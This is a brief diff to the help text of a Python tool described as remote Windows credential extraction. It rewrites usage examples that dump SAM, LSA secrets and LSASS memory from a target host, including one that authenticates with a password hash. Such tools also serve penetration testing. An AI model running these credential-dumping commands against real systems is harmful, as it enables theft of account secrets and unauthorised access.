@@ -11,9 +11,11 @@ def main():
         description="Remote Windows credential extraction",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""examples:
-  python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa --lsass
-  python main.py -t 10.0.0.5 -u admin -H aad3b4...ef40 --sam
+  python main.py -t 10.0.0.5 -u admin -p pass --sam
+  python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa
   python main.py -t 10.0.0.5 -u admin -p pass --lsass
+  python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa --lsass
+  python main.py -t 10.0.0.5 -u admin -H aad3b4...ef40 --sam --lsa
 """,
     )
 
